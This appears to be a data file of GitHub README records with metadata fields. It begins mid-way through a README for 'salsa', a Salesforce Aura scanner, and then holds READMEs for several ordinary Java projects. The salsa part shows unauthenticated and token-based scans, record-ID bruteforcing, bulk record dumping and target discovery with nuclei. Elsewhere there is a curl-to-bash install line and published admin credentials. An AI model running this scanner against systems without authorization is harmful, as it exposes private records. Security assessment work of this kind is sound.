[!] No records found from recordId 00B0H000007t1qlUAA and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={ListView={_nameField=Name, _entityLabel=List View, _keyPrefix=00B}}, quickActionRecordTemplates={}, recordErrors={00B0H000007t1qlUAA={message=We couldn't find the record you're trying to access. It may have been deleted by another user, or there may have been a system error. Ask your administrator for help.}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={00B0H000007t1qlUAA=[00B0H000007t1qlUAA.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Aura: looking for records for type Country__c
[*] Looking for sObject with recordId 00B0H000007t1qgUAA and type(s) [ListView].
(...)
```

</details>

<details>
    <summary>Simple scan - Unauthenticated - Targetted record type and bruteforce</summary>

```bash
❯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --types Store__History --id 0176S0001GvGwvEQQS --bruteforce
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Scan will continue as unauthenticated (guest) user ...
[*] Looking for sObject with recordId 0176S0001GvGwvMQQS and type(s) [Store__History].
[!] Cannot find fields for object type Store__History through descriptor aura://RecordUiController/ACTION$getObjectInfo.
[!] Cannot find record with fields for ID 0176S0001GvGwvMQQS and type Store__History.
[!] The recordId 0176S0001GvGwvMQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvMQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvMQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvMQQS=[0176S0001GvGwvMQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvNQQS and type(s) [Store__History].
[!] Cannot find record with fields for ID 0176S0001GvGwvNQQS and type Store__History.
[!] The recordId 0176S0001GvGwvNQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvNQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvNQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvNQQS=[0176S0001GvGwvNQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvLQQS and type(s) [Store__History].
[!] Cannot find record with fields for ID 0176S0001GvGwvLQQS and type Store__History.
[!] The recordId 0176S0001GvGwvLQQS cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId 0176S0001GvGwvLQQS and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={0176S0001GvGwvLQQS={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={0176S0001GvGwvLQQS=[0176S0001GvGwvLQQS.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Looking for sObject with recordId 0176S0001GvGwvKQQS and type(s) [Store__History].
(...)
```

</details>

<details>
    <summary>Simple scan - Authenticated - Targetted record type</summary>

```bash
❯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --types User --sid '00Di000.REDACTED' --token ""eyJ2ZXIiOi.REDACTED""
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Will try with explicitly provided credentials {username=''}
[*] Looking for all objects with type(s) [User].
[*] Aura: looking for records for type User
[!] Client is out-of-sync. Will retry with new FWUID: WFIwUmVJdm.REDACTED
[*] Looking for sObject with recordId 005ixxxxx and type(s) [User].
[*] Found 190 fields for sObject type User from Aura service.
[*] Found record 005ixxxxxx with descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord!
[*] 1 object(s) retrieved with descriptor serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems from object type User!
[*] End of scanning of https://www.target.com
```

</details>

<details>
    <summary>Simple scan - Authenticated - Custom record types dump</summary>

```bash
❯ java -jar target/salsa-jar-with-dependencies.jar -t https://www.target.com --typesapi --custom --sid '00Di000.REDACTED' --token ""eyJ2ZXIiOi.REDACTED"" --dump --proxy 127.0.0.1:8080
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[*] Searching for Salesforce Aura instance on https://www.target.com ...
[!] Found Salesforce Aura instance on path: /aura
[!] Will try with explicitly provided credentials {username=''}
[*] Looking for all objects with standard or custom types.
[*] Will retrieve all sObjects types known by the target from Aura service.
[!] Client is out-of-sync. Will retry with new FWUID: WFIwUmVJ...REDACTED
[*] Found 2111 object types from Salesforce Aura service!
[*] Will retrieve all sObjects types known by the target from REST sObject API.
[*] Found 279 object types from Salesforce REST sObject API!
[*] Reducing to 24 custom object types.
[*] Aura: looking for records for type MyOtherType__c
[*] SOAP: looking for records for type MyOtherType__c
[*] Found 0 entities of types MyOtherType__c through SOAP API!
[*] Query Data API: looking for records for type MyOtherType__c
[*] SObject Data API: looking for records for type MyOtherType__c
[*] Aura: looking for records for type Wonderful__c
[*] SOAP: looking for records for type Wonderful__c
[*] Found 0 entities of types Wonderful__c through SOAP API!
[*] Query Data API: looking for records for type Wonderful__c
[*] SObject Data API: looking for records for type Wonderful__c
[*] Aura: looking for records for type MyOtherTypeAgain__c
[*] SOAP: looking for records for type MyOtherTypeAgain__c
[*] Found 0 entities of types MyOtherTypeAgain__c through SOAP API!
[*] Query Data API: looking for records for type MyOtherTypeAgain__c
[*] SObject Data API: looking for records for type MyOtherTypeAgain__c
[*] Aura: looking for records for type MyType__c
[*] SOAP: looking for records for type MyType__c
[*] Found 10 entities of types MyType__c through SOAP API!
[*] Looking for sObject with recordId a4AREDACTED and type(s) [MyType__c].
[!] Cannot find fields for object type MyType__c through descriptor aura://RecordUiController/ACTION$getObjectInfo.
[*] Found 29 fields for sObject type MyType__c from REST sObject API.
[!] Cannot find record with fields for ID a4AREDACTED and type MyType__c.
[!] The recordId a4AREDACTED cannot be found through descriptor serviceComponent://ui.force.components.controllers.detail.DetailController/ACTION$getRecord (error: You don't have access to this record. Ask your administrator for help or to request access.).
[!] No records found from recordId a4AREDACTED and descriptor serviceComponent://ui.force.components.controllers.recordGlobalValueProvider.RecordGvpController/ACTION$getRecord: {objectMetadata={}, quickActionRecordTemplates={}, recordErrors={a4AREDACTED={message=You don't have access to this record. Ask your administrator for help or to request access., inaccessible=true}}, records={}, recordTemplates={}, resolvedDraftIds=[], quickActionMetadata={}, refreshErrors=[], requestIds={a4AREDACTED=[a4AREDACTED.null.null.null.Id.VIEW]}, purgedRecordIds=[], layouts={}}
[*] Found sObject a4AREDACTED of type MyType__c from REST sObject API: [MyType__c]{[[StartDateTime__c=2023-12-05T18:00:00.000+0000], [CreatedDate=2023-11-28T14:07:00.000+0000],....]}
[*] Looking for sObject with recordId a4A6REDACTED and type(s) [MyType__c].
[!] Cannot find record with fields for ID a4A6REDACTED and type MyType__c.
(...)
[*] Query Data API: looking for records for type TR_MyLV_Diamond__c
[*] SObject Data API: looking for records for type TR_MyLV_Diamond__c
[*] Will dump merged object a4AREDACTED to ./output2024.07.22.21.57.00/MyType__c/a4AREDACTED.json
[*] Will dump merged object a2RREDACTED to ./output2024.07.22.21.57.00/MyOtherType__c/a2RREDACTED.json
[*] Will dump merged object a0NREDACTED to ./output2024.07.22.21.57.00/MyOtherTypeAgain__c/a0NREDACTED.json
(...)
```

**Dumped records will be stored into a timestamped output folder**

</details>

## Current limitations

- SOAP `query` requests are limited to 10 items.
- Bruteforcing IDs is limited to 10 items.

## TODO

*Release date: maybe one day*

- [ ] Find & add alternatives authentications.
- [ ] Detect `debug` mode arbitrary activation ([https://www.cosades.com/posts/sf_debug_mode](https://www.cosades.com/posts/sf_debug_mode)).  
- [ ] Download item for *Document* type identifier (hit `https://ATTACHMENTS_DOMAIN/sfc/servlet.shepherd/version/download/<id>` - *URL can also be found in `Generic_DocumentDownloadPathUrl` attribute from descriptor `serviceComponent://ui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableComponentLoaderController/ACTION$getPageComponent`*)  
- [ ] Data API - Composite: `/services/data/vXX.0/composite/batch` (POST, with examples parameters: `{""batchRequests"": [{""method"": ""PATCH"", ""url"": ""v38.0/sobjects/OpportunityLineItem/<ID>"", ""richInput"": {""End_Date__c"": ""2017-01-19""}]}}`)  
- [ ] Data API - Anonymous APEX execution: `/services/data/vXX.0/tooling/executeAnonymous/?anonymousBody=`
- [ ] Async API - Job: `/services/async/xx.0/job` (POST and `<?xml version=""1.0"" encoding=""UTF-8""?><jobInfo xmlns=""http://www.force.com/2009/06/asyncapi/dataload""><operation>update</operation><object>OpportunityLineItem</object><contentType>CSV</contentType></jobInfo>` or `<?xml version=""1.0"" encoding=""UTF-8""?><jobInfo xmlns=""http://www.force.com/2009/06/asyncapi/dataload""><state>Closed</state></jobInfo>`). Other related endpoints: `/services/data/v60.0/jobs/query`, `/services/async/xx.0/job/JOBID`,  `/services/async/xx.0/job/JOBID/batch`, `/services/async/xx.0/job/JOBID/batch/BATCHID/result`
- [ ] Apex REST API: `/services/apexrest/SoapMessage`, `/services/apexrest/Cases`
- [ ] Find the parameters for other classic Aura controllers 🥹

## Troubleshooting

> **Disclaimer: ""spaghetti code"" here, due to Salesforce technical contexts discoveries, mixed between official documentations, write-ups, reverse engineering, empirical tests. Hence I could study for small new features proposals or major bug fixes, this tool is now hard to maintain.**

***Then, before opening an issue, please consider the following points:***

1. I strongly encourage you to **switch the logging level** to `DEBUG` or `TRACE` level (`--debug` / `--trace`).
2. The tool can send **thousand of requests** and **works for hours**. Two possible consequences:

- **You can be banned** by the target.
- **The authentication could have a short expiration time on your target**. *I do not know how to detect & manage that part, there is no real homogeneous behaviour for this.* I could only suggest you to reduce the record types to test.

3. I think the tool is adapted to most of Salesforce contexts, **but not all of them**.
4. Route the tool **an HTTP proxy** for further investigation (`--proxy 127.0.0.1:8080` for instance)

## Q/A

*Why is the authentication username/password does not work ?*

> Because the target is maybe not using the Aura Controller `apex://LightningLoginFormController/ACTION$login`: prefer using the `sid` (session id) or `token` (Aura token) after a manual authentication.  

*What's is the difference between `sid` and `token` ?*

> The `token` is used for authenticated Aura controller interactions. The `sid` is used to interact with other APIs (and sometimes Aura controllers). The format are not the same though: for the `token` it is more like a JWT, for the `sid` it is prefixed by the organization identifier.

*Why there are limitations regarding the amount of data dump in queries for example ?*

> Yes, it could be improved with new arguments. The initial reason was that the tool can launch thousand of requests and could last for hours (Entities count / fields cound / controllers count / services count / etc.). The limitations are present to reduce the duration. Feel free to change that.

*How do I find targets ?*

> It is up to you, but it can be done with nuclei: `nuclei -rl 10 -t ""http/misconfiguration/salesforce-aura.yaml"" -l subdomains.txt`

*Why the source code is so complex ? Why Java ?*

> In the beginning it was a clean set of small scripts. Discoveries after discoveries, I have added, modified, removed some parts. Without unit tests. And Salesforce contexts are very complex / customisable, targets behaviors can differ and code is adapted with some unelegant if/then/else. The last reason is that I wanted to have the most adaptable and automatized tool for this kind of assessment. I dig into complex workflows, but abandonned some steps. Why Java ? Because Salesforce APEX is very close to Java, and Salesforce have some libraries in Java which could be decompiled to be dynamically integrated into the tool. And I like Java (nobody is perfect).

## Credits and ressources

Thanks for all these ressources (tools, write-ups, docs, ...), which help me a lot:

- https://www.fishofprey.com/
- https://developer.salesforce.com/
- https://developer.salesforce.com/blogs/tech-pubs/2017/01/simplify-your-api-code-with-new-composite-resources
- https://developer.salesforce.com/docs/atlas.en-us.api_tooling.meta/api_tooling/intro_rest_resources.htm
- https://developer.salesforce.com/docs/atlas.en-us.api_tooling.meta/api_tooling/tooling_api_objects_traceflag.htm
- https://www.varonis.com/blog/abusing-salesforce-communities
- https://github.com/tedconn/lwr-mobify
- https://github.com/Ophion-Security/sret
- https://github.com/forcedotcom/aura
- https://github.com/jeffzmartin/SalesforceSQLSchemaGenerator
- https://github.com/LTiDi2000/SFMisCheck/blob/main/sf.py
- https://github.com/pingidentity/AuraIntruder/
- https://www.youtube.com/watch?v=wHqp6laTnio
- https://web.archive.org/web/20201031233746/https://www.enumerated.de/index/salesforce
- https://codefriar.wordpress.com/2014/10/30/eval-in-apex-secure-dynamic-code-evaluation-on-the-salesforce1-platform/
- https://blog.intigriti.com/hacking-tools/hacking-salesforce-lightning-guide-for-bug-hunters

## Licence

Released under [GPL-3.0 license](/LICENSE).  
",3,0,2,0.0,"['salsa', 'salesforce', 'scanner', 'aura', 'and', 'beyond', 'feature', 'usage', 'help', 'example', 'current', 'limitation', 'todo', 'troubleshoot', 'credit', 'ressources', 'licence']","['salsa', 'salesforce', 'scanner', 'aura', 'and']",1.0,"[maven-assembly-plugin,maven-release-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,1.0,0.0
sivaprasadreddy/spring-modular-monolith,main,"# spring-modular-monolith
An e-commerce application following Modular Monolith architecture using [Spring Modulith](https://spring.io/projects/spring-modulith).
The goal of this application is to demonstrate various features of Spring Modulith with a practical application.

![bookstore-modulith.png](bookstore-modulith.png)

This application follows modular monolith architecture with the following modules:

* **Common:** This module contains the code that is shared by all modules.
* **Catalog:** This module manages the catalog of products and store data in `catalog` schema.
* **Customers:** This module implements the customer management and store data in `customers` schema.
* **Orders:** This module implements the order management and store the data in `orders` schema.
* **Inventory:** This module implements the inventory management and store the data in `inventory` schema.
* **Notifications:** This module handles the events published by other modules and sends notifications to the interested parties.

**Goals:**
* Implement each module as independently as possible.
* Prefer event driven communication over direct module dependency wherever applicable.
* Store data managed by each module in an isolated manner by using different schema or database.
* Each module should be testable by loading only module-specific components.

**Module communication:**

* **Common** module is an OPEN module that can be used by other modules.
* **Orders** module invokes the **Catalog** module public API to validate the order details
* When an Order is successfully created, **Orders** module publishes **""OrderCreatedEvent""**
* The **""OrderCreatedEvent""** will also be published to external broker like RabbitMQ. Other applications may consume and process those events.
* **Inventory** module consumes ""OrderCreatedEvent"" and updates the stock level for the products.
* **Notifications** module consumes ""OrderCreatedEvent"" and sends order confirmation email to the customer.

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK, Gradle using [SDKMAN](https://sdkman.io/)

```shell
$ curl -s ""https://get.sdkman.io"" | bash
$ source ""$HOME/.sdkman/bin/sdkman-init.sh""
$ sdk install java 21.0.1-tem
$ sdk install gradle
$ sdk install maven
```

Task is a task runner that we can use to run any arbitrary commands in easier way.

```shell
$ brew install go-task
(or)
$ go install github.com/go-task/task/v3/cmd/task@latest
```

Verify the prerequisites

```shell
$ java -version
$ docker info
$ docker compose version
$ task --version
```

## Using `task` to perform various tasks:

The default `Taskfile.yml` is configured to use Gradle.
Another `Taskfile.maven.yml` is also created with Maven configuration.

If you want to use Maven instead of Gradle, then add `-t Taskfile.maven.yml` for the `task` commands.

For example: 

```shell
$ task test` // uses Gradle
$ task -t Taskfile.maven.yml test` //uses Maven
```

```shell
# Run tests
$ task test

# Automatically format code using spotless-maven-plugin
$ task format

# Build docker image
$ task build_image

# Run application in docker container
$ task start
$ task stop
$ task restart
```

* Application URL: http://localhost:8080 
* Actuator URL: http://localhost:8080/actuator 
* Actuator URL for modulith: http://localhost:8080/actuator/modulith
* RabbitMQ Admin URL: http://localhost:15672 (Credentials: guest/guest)
* Zipkin URL: http://localhost:9411

## Deploying on k8s cluster
* [Install kubectl](https://kubernetes.io/docs/tasks/tools/)
* [Install kind](https://kind.sigs.k8s.io/docs/user/quick-start/)

```shell
$ brew install kubectl
$ brew install kind
```

Create KinD cluster and deploy app.

```shell
# Create KinD cluster
$ task kind_create

# deploy app to kind cluster 
$ task k8s_deploy

# undeploy app
$ task k8s_undeploy

# Destroy KinD cluster
$ task kind_destroy
```
",0,1,1,1.0,"['prerequisite', 'use', 'task', 'perform', 'various', 'task', 'run', 'test', 'automatically', 'format', 'code', 'use', 'build', 'docker', 'image', 'run', 'application', 'docker', 'container', 'deploy', 'cluster', 'create', 'kind', 'cluster', 'deploy', 'app', 'kind', 'cluster', 'undeploy', 'app', 'destroy', 'kind', 'cluster']","['cluster', 'kind', 'use', 'task', 'run']",1.0,"[com.diffplug.spotless:spotless-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
Zalaya/sorting-algorithms,main,"# Sorting Algorithms in Java

This project is a collection of classic sorting algorithms implemented in Java, aimed at providing an educational resource for understanding the importance and mechanics of sorting in computer science.

## Table of Contents

- [Introduction](#introduction)
- [Algorithms Included](#algorithms-included)
- [Project Structure](#project-structure)
- [Testing](#testing)
- [Contributing](#contributing)
- [License](#license)

## Introduction

Sorting algorithms are a key concept in computer science due to their role in optimizing the performance of other algorithms, which require sorted data for efficient operation. Understanding different sorting algorithms helps in selecting the right algorithm for a given problem based on its time complexity and use case.

This project showcases different sorting techniques with clear and concise Java implementations. It is a great starting point for learners who want to dive deeper into algorithm design and analysis.

## Algorithms Included

- **Bubble Sort:** A basic comparison-based sorting algorithm that repeatedly steps through the list, compares adjacent elements, and swaps them if they are in the wrong order.
- **Selection Sort:** An algorithm that divides the input list into two parts: the sorted part at the beginning and the unsorted part at the end, and repeatedly selects the smallest (Or largest) element from the unsorted part.
- **Insertion Sort:** A simple sorting algorithm that builds the final sorted array one item at a time, inserting each element into its correct position.
- **Merge Sort:** A divide-and-conquer algorithm that divides the input array into two halves, recursively sorts the two halves, and then merges the sorted halves.
- **Quick Sort:** A divide-and-conquer algorithm that selects a ""pivot"" element and partitions the array around the pivot, then recursively sorts the subarrays.
- **Heap Sort:** A comparison-based sorting algorithm that uses a binary heap data structure to sort elements in place.

More algorithms will be added over time to expand this educational resource.

## Project Structure

The project is organized into several key directories:

- `src/main/java/xyz/zalaya/sorting/algorithms`: Contains the core implementations of the sorting algorithms.
- `src/test/java/xyz/zalaya/sorting/algorithms`: Contains unit tests to validate the correctness of the algorithms.
- `.editorconfig`: Provides configuration for consistent code style across different IDEs and text editors.

The project is designed to be modular and easy to navigate, with all implementations and tests neatly organized for clarity and learning purposes.

## Testing

Testing is a critical part of understanding and validating algorithms. This project includes unit tests in the `src/test/java/xyz/zalaya/sorting/algorithms/implementations` directory to verify the correctness and performance of the sorting algorithms.

To run the tests, simply execute:

```bash
mvn test
```

This will ensure that all algorithms behave as expected under various conditions.

## Contributing

Contributions are welcome! Whether you want to add new sorting algorithms, optimize existing ones, or improve the documentation, your input is valuable.

For more information on how to contribute, please check the [CONTRIBUTING.md](CONTRIBUTING.md) file.

## License

This project is licensed under the [GNU General Public License v3.0](LICENSE). For more details, please refer to the [LICENSE.md](LICENSE) file.
",0,1,1,7.0,"['sort', 'algorithm', 'java', 'table', 'content', 'introduction', 'algorithm', 'include', 'project', 'structure', 'test', 'contribute', 'license']","['algorithm', 'sort', 'java', 'table', 'content']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
Anyel-ec/SecurityMonitoring,main,"# Dynamic Database Monitoring: MongoDB, MariaDB/MySQL, PostgreSQL using React and Spring Boot

This project aims to develop an open-source tool for dynamic monitoring of three databases: **MongoDB**, **PostgreSQL**, and **MariaDB/MySQL**. The tool allows users to specify connection credentials through a web interface in **React**, and subsequently visualize customized dashboards in **Grafana** for one or several databases in a combined manner.

The backend is built with **Spring Boot** and uses **Prometheus** and **Grafana** to collect and visualize the selected database metrics.

## Project Status

This project is under development. The following has been implemented so far:
- A **React** interface for entering database connection credentials.
- **Docker Compose** integration with services for Grafana, Prometheus, and exporters for **PostgreSQL**, **MongoDB**, and **MariaDB** databases.
- Initial monitoring and visualization configuration in **Grafana**.

## Technologies Used

- **Frontend**: React (created with Vite), React Bootstrap for designing dynamic forms.
- **Backend**: Spring Boot (under development).
- **Monitoring and Visualization**: Grafana and Prometheus.
- **Databases**: MongoDB, PostgreSQL, and MariaDB.
- **Containers**: Docker and Docker Compose for service orchestration.

## Features

1. **Database Connection Configuration**:
    - Users can specify credentials to connect to **MongoDB**, **PostgreSQL**, and **MariaDB** via a dynamic form in the React app.
    - It allows the combination of different databases: for example, monitoring only **MongoDB**, **PostgreSQL**, or **MariaDB**, or combinations like **MongoDB+PostgreSQL**.

2. **Dynamic Monitoring**:
    - The backend in **Spring Boot** (upcoming development) will receive the credentials provided by the user and configure the connections to the databases.
    - Metrics are collected using **Prometheus** and visualized through **Grafana**.

3. **Visualization in Grafana**:
    - Preconfigured dashboards in **Grafana** that are activated based on the databases selected by the user.

## Project Structure

```
.
├── frontend/                    # React Application
│   ├── src/
│   │   ├── components/          # React Components (includes SwitchToggle, Forms, etc.)
│   │   └── App.js               # React entry point
│   └── public/                  # Static files
├── backend/                     # Upcoming: Spring Boot Backend
├── .devcontainer/               # Development container configurations
└── README.md                    # Project documentation
```

## Prerequisites

- **Docker** and **Docker Compose** installed.
- **Node.js** and **npm** installed for the React frontend.

## Installation and Usage

### 1. Clone the Repository

```bash
git clone https://github.com/Anyel-ec/SecurityMonitoring
cd SecurityMonitoring
```

### 2. Run the Frontend

```bash
cd frontend
npm install
npm run dev
```

### 3. Run the Services with Docker Compose

```bash
docker-compose up -d
```

This will launch the following services:
- **Grafana**: Accessible at `http://localhost:3000` (user: `admin`, password: `admin`).
- **Prometheus**: Accessible at `http://localhost:9090`.
- **PostgreSQL Exporter**: Accessible at `http://localhost:9187`.
- **MongoDB Exporter**: Accessible at `http://localhost:9216`.
- **MariaDB Exporter**: Accessible at `http://localhost:9104`.

### 4. Configure Grafana

1. Access **Grafana** at `http://localhost:3000`.
2. Log in using the credentials (`admin/admin`).
3. Add **Prometheus** as a data source:
   - URL: `http://prometheus:9090`.
4. Import the relevant dashboard to visualize the metrics for the configured databases.

### 5. Next Steps

The next step in development is to integrate the **Spring Boot** backend to handle dynamic database connections and automatically configure Prometheus exporters based on the credentials provided.

## Docker Compose Configuration (`docker-compose.yml`)

The `docker-compose.yml` file is configured to start the necessary services for monitoring the databases and visualizing them in Grafana. Below is the current configuration:

```yaml
version: '3'

services:
  grafana:
    image: grafana/grafana
    ports:
      - ""3000:3000""
    environment:
      GF_SECURITY_ADMIN_USER: admin
      GF_SECURITY_ADMIN_PASSWORD: admin
    volumes:
      - grafana_storage:/var/lib/grafana
    
  prometheus:
    image: prom/prometheus
    ports:
      - ""9090:9090""
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml:ro 
    
  # MongoDB Service
  mongo_db:
    image: mongo:latest
    ports:
      - ""27020:27017""
    volumes:
      - mongo_data:/data/db
  
  # MariaDB Service
  mariadb_db:
    image: mariadb:latest
    restart: always
    environment:
      MYSQL_DATABASE: ${MYSQL_DATABASE}
      MYSQL_USER: ${MYSQL_USER}
      MYSQL_PASSWORD: ${MYSQL_PASSWORD}
      MYSQL_ROOT_PASSWORD: ${MYSQL_ROOT_PASSWORD}
    ports:
      - ""3306:3306""
    expose:
      - ""3306""

  # PostgreSQL Service
  postgresql_db:
    image: postgres:latest
    volumes:
      - postgres_data:/var/lib/postgresql/data
    environment:
      POSTGRES_DB: ${POSTGRES_DB}
      POSTGRES_USER: ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    ports:
      - ""5433:5432""
  
  ##############################################
  # Exporter Services
  mongo-exporter:
    image: ssheehy/mongodb-exporter:latest
    ports:
      - ""9216:9216""
    environment:
      MONGODB_URI: ""mongodb://mongo_db:27017""
    depends_on:
      - mongo_db
  
  postgres-exporter:
    image: prometheuscommunity/postgres-exporter
    ports:
      - ""9187:9187""
    environment:
      DATA_SOURCE_NAME: ""postgresql://postgres:${POSTGRES_PASSWORD}@postgresql_db:5432/${POSTGRES_DB}?sslmode=disable""
    depends_on:
      - postgresql_db

  mariadb-exporter:
    image: prom/mysqld-exporter
    depends_on:
      - mariadb_db
    command:
      - --config.my-cnf=/cfg/.my.cnf
      - --mysqld.address=192.168.0.215:3306
    volumes:
      - ""./.my.cnf:/cfg/.my.cnf""
    ports:
      - ""9104:9104""
  
volumes:
  grafana_storage:
  postgres_data:
  mongo_data:
```

## Prometheus Configuration (`prometheus.yml`)

The `prometheus.yml` file is configured to monitor services for MongoDB, PostgreSQL, and MariaDB through their respective exporters.

```yaml
global:
  scrape_interval: 5s

scrape_configs:
  - job_name: 'prometheus'
    static_configs:
      - targets: ['prometheus:9090']

  - job_name: 'postgres'
    static_configs:
      - targets: ['postgres-exporter:9187']

  - job_name: 'mongo'
    static_configs:
      - targets: ['mongo-exporter:9216']

  - job_name: 'mariadb'
    static_configs:
      - targets: ['192.168.0.215:9104']
```

## Contribution

This project is open-source, and any contributions are welcome. If you'd like to collaborate, follow these steps:

1. Fork the repository.
2. Create a new branch for your feature (`git checkout -b feature/new-feature`).
3. Commit your changes (`git commit -m 'Add new feature'`).
4. Push your branch (`git push origin feature/new-feature`).
5. Open a **Pull Request** for review.

## Project Status

This project is still under development, and some of the functionalities described are under construction.

Upcoming features include:
- Full integration with **Spring Boot**.
- Enhanced configuration and customization of **Grafana** dashboards for each database.
- Support for more databases and monitoring systems.
",0,0,2,0.0,"['dynamic', 'database', 'monitoring', 'mongodb', 'postgresql', 'use', 'react', 'spring', 'boot', 'project', 'status', 'technology', 'use', 'feature', 'project', 'structure', 'react', 'application', 'react', 'component', 'include', 'switchtoggle', 'form', 'etc', 'react', 'entry', 'point', 'static', 'file', 'upcoming', 'spring', 'boot', 'backend', 'development', 'container', 'configuration', 'project', 'documentation', 'prerequisite', 'installation', 'usage', 'clone', 'repository', 'run', 'frontend', 'run', 'service', 'docker', 'compose', 'configure', 'grafana', 'next', 'step', 'docker', 'compose', 'configuration', 'mongodb', 'service', 'mariadb', 'service', 'postgresql', 'service', 'exporter', 'service', 'prometheus', 'configuration', 'contribution', 'project', 'status']","['service', 'react', 'project', 'configuration', 'mongodb']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
ngud-119/Social-Network,master,"# Social-Network

Social-Network is a Stateful app built with [Spring Boot](http://spring.io/projects/spring-boot), [MySQL](https://www.mysql.com/) and [React](https://reactjs.org/).

Features:
- Routing
- User authentication: Register/Login/Logout
- 3 User Roles: Root, Admin and User
- Promoting/Demoting users to Admin/User
- Creating and deleting users
- Editing user profile
- Searching for friends
- Sending and accepting friend requests
- Removing friends from the friends list
- Adding and deleting photos
- Creating and deleting posts
- Creating and deleting comments
- Chat functionality: writing and receiving messages from your friends
- Logs history

The project is deployed on [Heroku](https://social-network-kl.herokuapp.com/).

**Admin Credentials:**
- username: john
- password: 1111

## Requirements

1. Java 11

2. In order to be able to save `Photos` you need to sign up to [Cloudinary](https://cloudinary.com/) and enter your credentials in the `application.properties` file of the Spring Boot app (`SocialNetwork\Server\src\main\resources\application.properties`)

## Start the app

### **Option 1 - Start the Client and the Server manually**

#### 1. Start the Client

To start the Client you need to enter the `SocialNetwork/Client` folder:

```bash
$ cd SocialNetwork/Client
```

Install all dependencies:

```bash
$ npm install
```

Run the app in the development mode:

```bash
$ npm start
```

Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

#### 2. Start the Server

Go to the root directory of the Spring Boot app:

```bash
$ cd SocialNetwork/Server
```

Start the Server:

```bash
$ mvn spring-boot:run
```
The Server is running on port `8000`.


### **Option 2 - Start the application in Docker**

1. **Start the application**

Go to the project directory( `SocialNetwork/` ) and run:

```bash
$ docker-compose up -d
```

The front-end server will start on port `9090`. To open it enter in your browser:

```bash
$ http://localhost:9090
```
2. **Stop the application**

You can stop the containers with:

 ```bash 
 $ docker-compose down
 ```

## App screenshots

1. **Home Page**

 ![App Screenshot](readme-images/kl-social-network-home-gregor.PNG)

2. **Friends Page**

 ![App Screenshot](readme-images/kl-social-network-friends-gregor.PNG)

3. **Photos Page**

 ![App Screenshot](readme-images/kl-social-network-photos-gregor.PNG)
",0,0,1,0.0,"['requirement', 'start', 'app', 'option', 'start', 'client', 'server', 'manually', 'start', 'client', 'start', 'server', 'option', 'start', 'application', 'docker', 'app', 'screenshots']","['start', 'app', 'option', 'client', 'server']",1.0,"[maven-resources-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
KirDemorgan/BeatSaberDsBot,master,"# BeatSaber Discord Bot

## Overview
This project is a Discord bot designed to integrate with the BeatSaber game, allowing users to fetch and display their BeatSaber statistics directly in Discord. The bot uses the ScoreSaber API to retrieve player data, including scores, ranks, and performance points (pp), and then assigns Discord roles based on the player's rank in the game.

## Features
- **Player Statistics**: Fetch and display individual player statistics from ScoreSaber.
